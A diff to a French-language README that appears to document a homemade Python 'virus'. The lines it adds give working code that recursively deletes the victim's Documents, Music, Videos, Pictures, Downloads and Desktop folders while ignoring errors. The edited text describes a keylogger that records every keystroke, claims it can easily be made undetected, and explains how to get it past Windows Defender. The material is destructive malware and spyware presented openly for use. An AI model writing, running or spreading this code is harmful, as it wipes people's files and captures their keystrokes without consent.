@@ -164,9 +164,36 @@ for x in range(350):
 
 #----------------------------------------
 ```
+## Supression des fichiers utilisateurs
+
+Pour cette dernière partie du code, le virus va ouvrir se rendre dans les dossiers de l'utilisateur (Bureau,Musique,Vidéos,Photos,Téléchargements,Documents) et supprimer tous les fichiers
+
+```python
+    #----------------Delete les fichiers utilisateur---------------
+
+    #ignore_errors=True = Delete aussi les read only files
+    pathDocument = str(os.path.join(os.environ['USERPROFILE'], "Documents"))
+    shutil.rmtree(pathDocument, ignore_errors=True)
+
+    pathMusic = str(os.path.join(os.environ['USERPROFILE'], "Music"))
+    shutil.rmtree(pathMusic, ignore_errors=True)
+
+    pathVideos = str(os.path.join(os.environ['USERPROFILE'], "Videos"))
+    shutil.rmtree(pathVideos, ignore_errors=True)
+
+    pathPictures = str(os.path.join(os.environ['USERPROFILE'], "Pictures"))
+    shutil.rmtree(pathPictures, ignore_errors=True)
+
+    pathDownloads = str(os.path.join(os.environ['USERPROFILE'], "Downloads"))   
+    shutil.rmtree(pathDownloads, ignore_errors=True)
+
+    pathDesktop = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))   
+    shutil.rmtree(pathDesktop, ignore_errors=True)
+```
+
 ## Keylogger
 
-Cette dernière partie du code va ouvrir un keylogger qui enregistrera **TOUTES** les frappes de la victime, ce dernier est très simplifié pour ne pas faire un projet dédié keylogger au sein du fichier, il est cependant tout à fait possible ( et simple ) d'implémenter un keylogger non détécté
+Cette partie du code va ouvrir un keylogger qui enregistrera **TOUTES** les frappes de la victime, ce dernier est très simplifié pour ne pas faire un projet dédié keylogger au sein du fichier, il est cependant tout à fait possible ( et simple ) d'implémenter un keylogger non détécté
 
 
 Il est donc détécté par Windows defender, afin de le tester il suffit de cliquer sur " autoriser sur l'appareil " dans Windows Defender puis " Intervenir "
@@ -192,3 +219,4 @@ def on_press(key):
 with Listener(on_press=on_press) as listener :
     listener.join()
 ```
+
